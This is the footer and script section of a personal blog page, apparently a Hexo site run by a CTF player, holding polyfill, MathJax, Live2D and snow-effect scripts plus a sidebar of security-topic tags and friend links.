y,g=p[d],b=v[g],x=u[g],m=x&&x.prototype;if(m&&(m[s]||c(m,s,h),m[l]||c(m,l,g),f[g]=h,b))for(y in e)m[y]||o(m,y,e[y],!0)}},function(t,n,r){var e=r(1),i=r(158);e(e.G+e.B,{setImmediate:i.set,clearImmediate:i.clear})},function(t,n,r){var e=r(3),i=r(1),o=r(133),u=[].slice,c=/MSIE .\./.test(o),f=function(i){return function(t,n){var r=2<arguments.length,e=!!r&&u.call(arguments,2);return i(r?function(){("function"==typeof t?t:Function(t)).apply(this,e)}:t,n)}};i(i.G+i.B+i.F*c,{setTimeout:f(e.setTimeout),setInterval:f(e.setInterval)})},function(t,n,r){r(341),r(280),r(282),r(281),r(284),r(286),r(291),r(285),r(283),r(293),r(292),r(288),r(289),r(287),r(279),r(290),r(294),r(295),r(247),r(249),r(248),r(297),r(296),r(267),r(277),r(278),r(268),r(269),r(270),r(271),r(272),r(273),r(274),r(275),r(276),r(250),r(251),r(252),r(253),r(254),r(255),r(256),r(257),r(258),r(259),r(260),r(261),r(262),r(263),r(264),r(265),r(266),r(328),r(333),r(340),r(331),r(323),r(324),r(329),r(334),r(336),r(319),r(320),r(321),r(322),r(325),r(326),r(327),r(330),r(332),r(335),r(337),r(338),r(339),r(242),r(244),r(243),r(246),r(245),r(231),r(229),r(235),r(232),r(238),r(240),r(228),r(234),r(225),r(239),r(223),r(237),r(236),r(230),r(233),r(222),r(224),r(227),r(226),r(241),r(162),r(313),r(197),r(318),r(198),r(314),r(315),r(316),r(317),r(298),r(196),r(199),r(200),r(353),r(342),r(343),r(348),r(351),r(352),r(346),r(349),r(347),r(350),r(344),r(345),r(299),r(300),r(301),r(302),r(303),r(306),r(304),r(305),r(307),r(308),r(309),r(310),r(312),r(311),r(356),r(354),r(355),r(397),r(400),r(399),r(401),r(402),r(398),r(403),r(404),r(378),r(381),r(377),r(375),r(376),r(379),r(380),r(362),r(396),r(361),r(395),r(407),r(409),r(360),r(394),r(406),r(408),r(359),r(405),r(358),r(363),r(364),r(365),r(366),r(367),r(369),r(368),r(370),r(371),r(372),r(374),r(373),r(383),r(384),r(385),r(386),r(388),r(387),r(390),r(389),r(391),r(392),r(393),r(357),r(382),r(412),r(411),r(410),t.exports=r(46)},function(t,n){t.exports=function(t,n){if("string"==typeof n)return t.insertAdjacentHTML("afterend",n);var r=t.nextSibling;return r?t.parentNode.insertBefore(n,r):t.parentNode.appendChild(n)}}])</script><script src="/./main.a5fda8.js"></script><script>!function(){var e,t;e="/slider.27463f.js",t=document.createElement("script"),document.getElementsByTagName("body")[0].appendChild(t),t.setAttribute("src",e)}()</script>


<script type="text/x-mathjax-config">
  MathJax.Hub.Config({
      tex2jax: {
          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
          processEscapes: true,
          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
      }
  });

  MathJax.Hub.Queue(function() {
      var all = MathJax.Hub.getAllJax(), i;
      for(i=0; i < all.length; i += 1) {
          all[i].SourceElement().parentNode.className += ' has-jax';
      }
  });
</script>

<script src="//cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
</script>



<!--  -->

<script>
  /* 标签页标题切换 */
  var originTitle = document.title;
  var titleTime;
  document.addEventListener("visibilitychange", function () {
    if (document.hidden) {
      document.title = "(つェ⊂) 我藏好了哦~ " + originTitle;
      clearTimeout(titleTime);
    } else {
      document.title = "(*´∇｀*) 被你发现啦~ " + originTitle;
      titleTime = setTimeout(function () {
        document.title = originTitle;
      }, 2000);
    }
  });
</script>


    
<div class="tools-col" q-class="show:isShow,hide:isShow|isFalse" q-on="click:stop(e)">
  <div class="tools-nav header-menu">
    
    
      
      
      
    
      
      
      
    
      
      
      
    
    

    <ul style="width: 70%">
    
    
      
      <li style="width: 33.333333333333336%" q-on="click: openSlider(e, 'innerArchive')"><a href="javascript:void(0)" q-class="active:innerArchive">所有文章</a></li>
      
        
      
      <li style="width: 33.333333333333336%" q-on="click: openSlider(e, 'friends')"><a href="javascript:void(0)" q-class="active:friends">友链</a></li>
      
        
      
      <li style="width: 33.333333333333336%" q-on="click: openSlider(e, 'aboutme')"><a href="javascript:void(0)" q-class="active:aboutme">关于我</a></li>
      
        
    </ul>
  </div>
  <div class="tools-wrap">
    
    	<section class="tools-section tools-section-all" q-show="innerArchive">
        <div class="search-wrap">
          <input class="search-ipt" q-model="search" type="text" placeholder="find something…">
          <i class="icon-search icon" q-show="search|isEmptyStr"></i>
          <i class="icon-close icon" q-show="search|isNotEmptyStr" q-on="click:clearChose(e)"></i>
        </div>
        <div class="widget tagcloud search-tag">
          <p class="search-tag-wording">tag:</p>
          <label class="search-switch">
            <input type="checkbox" q-on="click:toggleTag(e)" q-attr="checked:showTags">
          </label>
          <ul class="article-tag-list" q-show="showTags">
             
              <li class="article-tag-list-item">
                <a href="javascript:void(0)" class="js-tag color4">CTF</a>
              </li>
             
              <li class="article-tag-list-item">
                <a href="javascript:void(0)" class="js-tag color3">vulnhub</a>
              </li>
             
              <li class="article-tag-list-item">
                <a href="javascript:void(0)" class="js-tag color2">Google Hack</a>
              </li>
             
              <li class="article-tag-list-item">
                <a href="javascript:void(0)" class="js-tag color2">Typora</a>
              </li>
             
              <li class="article-tag-list-item">
                <a href="javascript:void(0)" class="js-tag color2">Try hack me</a>
              </li>
             
              <li class="article-tag-list-item">
                <a href="javascript:void(0)" class="js-tag color4">Rce</a>
              </li>
             
              <li class="article-tag-list-item">
                <a href="javascript:void(0)" class="js-tag color1">python.学习篇</a>
              </li>
             
              <li class="article-tag-list-item">
                <a href="javascript:void(0)" class="js-tag color4">pwn</a>
              </li>
             
              <li class="article-tag-list-item">
                <a href="javascript:void(0)" class="js-tag color5">neural network</a>
              </li>
             
              <li class="article-tag-list-item">
                <a href="javascript:void(0)" class="js-tag color3">CTF-web</a>
              </li>
             
              <li class="article-tag-list-item">
                <a href="javascript:void(0)" class="js-tag color3">CTF-pwn</a>
              </li>
             
              <li class="article-tag-list-item">
                <a href="javascript:void(0)" class="js-tag color5">Log Audit</a>
              </li>
             
              <li class="article-tag-list-item">
                <a href="javascript:void(0)" class="js-tag color3">CTF-mis</a>
              </li>
             
              <li class="article-tag-list-item">
                <a href="javascript:void(0)" class="js-tag color4">CTF-misc</a>
              </li>
             
              <li class="article-tag-list-item">
                <a href="javascript:void(0)" class="js-tag color2">CTFpwn</a>
              </li>
            
            <div class="clearfix"></div>
          </ul>
        </div>
        <ul class="search-ul">
          <p q-show="jsonFail" style="padding: 20px; font-size: 12px;">
            缺失模块。<br/>1、请确保node版本大于6.2<br/>2、在博客根目录（注意不是yilia-plus根目录）执行以下命令：<br/> npm i hexo-generator-json-content --save<br/><br/>
            3、在根目录_config.yml里添加配置：
<pre style="font-size: 12px;" q-show="jsonFail">
  jsonContent:
    meta: false
    pages: false
    posts:
      title: true
      date: true
      path: true
      text: false
      raw: false
      content: false
      slug: false
      updated: false
      comments: false
      link: false
      permalink: false
      excerpt: false
      categories: false
      tags: true
</pre>
          </p>
          <li class="search-li" q-repeat="items" q-show="isShow">
            <a q-attr="href:path|urlformat" class="search-title"><i class="icon-quo-left icon"></i><span q-text="title"></span></a>
            <p class="search-time">
              <i class="icon-calendar icon"></i>
              <span q-text="date|dateformat"></span>
            </p>
            <p class="search-tag">
              <i class="icon-price-tags icon"></i>
              <span q-repeat="tags" q-on="click:choseTag(e, name)" q-text="name|tagformat"></span>
            </p>
          </li>
        </ul>
    	</section>
    

    
    	<section class="tools-section tools-section-friends" q-show="friends">
  		
        <ul class="search-ul">
          
            <li class="search-li">
              <a href="https://Isabella2inori.github.io" target="_blank" 
                class="search-title" title="老废物的牛马自我修养">
                
                  <img src="https://gravatar.loli.net/avatar/2893555f825ca98b73daffff0afc2866?s=200&d=mp&r=g">
                
                Myself
              </a>
            </li>
          
            <li class="search-li">
              <a href="https://fsjz2020.github.io" target="_blank" 
                class="search-title" >
                
                  <img src="https://fsjz2020.github.io/images/icon.png">
                
                FSJZ
              </a>
            </li>
          
            <li class="search-li">
              <a href="https://bing.com" target="_blank" 
                class="search-title" >
                
                  <i class="icon-link icon"></i>
                
                码云
              </a>
            </li>
          
            <li class="search-li">
              <a href="https://google.com" target="_blank" 
                class="search-title" >
                
                  <i class="icon-link icon"></i>
                
                简书
              </a>
            </li>
          
            <li class="search-li">
              <a href="https://baidu.com" target="_blank" 
                class="search-title" >
                
                  <i class="icon-link icon"></i>
                
                CSDN
              </a>
            </li>
          
        </ul>
  		
    	</section>
    

    
    	<section class="tools-section tools-section-me" q-show="aboutme">
        
          
  	  		<div class="aboutme-wrap" id="aboutme">CTFer, Hacker, Developer of computer science</div>
  	  	
    	</section>
    
  </div>
  
</div>
    <!-- Root element of PhotoSwipe. Must have class pswp. -->
<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">

    <!-- Background of PhotoSwipe. 
         It's a separate element as animating opacity is faster than rgba(). -->
    <div class="pswp__bg"></div>

    <!-- Slides wrapper with overflow:hidden. -->
    <div class="pswp__scroll-wrap">

        <!-- Container that holds slides. 
            PhotoSwipe keeps only 3 of them in the DOM to save memory.
            Don't modify these 3 pswp__item elements, data is added later on. -->
        <div class="pswp__container">
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
        </div>

        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
        <div class="pswp__ui pswp__ui--hidden">

            <div class="pswp__top-bar">

                <!--  Controls are self-explanatory. Order can be changed. -->

                <div class="pswp__counter"></div>

                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>

                <button class="pswp__button pswp__button--share" style="display:none" title="Share"></button>

                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>

                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>

                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
                <!-- element will get class pswp__preloader--active when preloader is running -->
                <div class="pswp__preloader">
                    <div class="pswp__preloader__icn">
                      <div class="pswp__preloader__cut">
                        <div class="pswp__preloader__donut"></div>
                      </div>
                    </div>
                </div>
            </div>

            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
                <div class="pswp__share-tooltip"></div> 
            </div>

            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
            </button>

            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
            </button>

            <div class="pswp__caption">
                <div class="pswp__caption__center"></div>
            </div>

        </div>

    </div>

</div>
  </div>

  
  
<script type="text/javascript" src="/plugins/activate-power-mode/activate-power-mode.js"></script>
<script>
  POWERMODE.colorful = true; // make power mode colorful
  POWERMODE.shake = false; // turn off shake
  document.body.addEventListener('input', POWERMODE);
</script>

  
  <!-- <script async type="text/javascript" size="90" alpha="0.2" zIndex="0" src="/plugins/ribbon.js/ribbon.min.js"></script> -->
  
  
    <script type="text/javascript" src="/plugins/live2d-widget.js/L2Dwidget.min.js"></script>
<script type="text/javascript">
  /**
   * 完整配置请参考：https://l2dwidget.js.org/docs/class/src/index.js~L2Dwidget.html#instance-method-init
   */
  var pluginModelPath = "assets/", // 模型的文件路径，无需更改
    pluginRootPath = "/live2d_models/"; // 插件的路径，无需更改
  //特定的模型json文件名称
  var modelPathJson = {
    "epsilon2_1": "Epsilon2.1",
    "gf": "Gantzert_Felixander",
    "haru/01": "haru01",
    "haru/02": "haru02",
    "nietzsche": "nietzche"
  }

  
    var modelName = "hibiki";
  

  var modelJsonPath = "";
  if (modelPathJson[modelName]) {
    modelJsonPath = pluginRootPath + modelName + "/" + pluginModelPath + modelPathJson[modelName] +
      ".model.json";
  } else {
    modelJsonPath = pluginRootPath + modelName + "/" + pluginModelPath + modelName + ".model.json";
  }
  L2Dwidget.init({
    model: {
      jsonPath: modelJsonPath
    },
    display: {
       position: "right", 
       width: 145, 
       height: 315, 
       hOffset: 50, 
      
    },
    mobile: {
       show: false, 
       scale: 0.6 
    },
    react: {
       opacity: 0.8 
    }
  })

</script>

  
  
  <script type="text/javascript" src="/lib/snow.js"></script>
  <script type="text/javascript" src="/lib/jquery-2.1.4.min.js"></script>
  <script>
    snow.down();
    $(window).resize(function() {
      $("canvas").css("z-index","500").remove();
      snow.down();
    });
  </script>
  
</body>

</html>
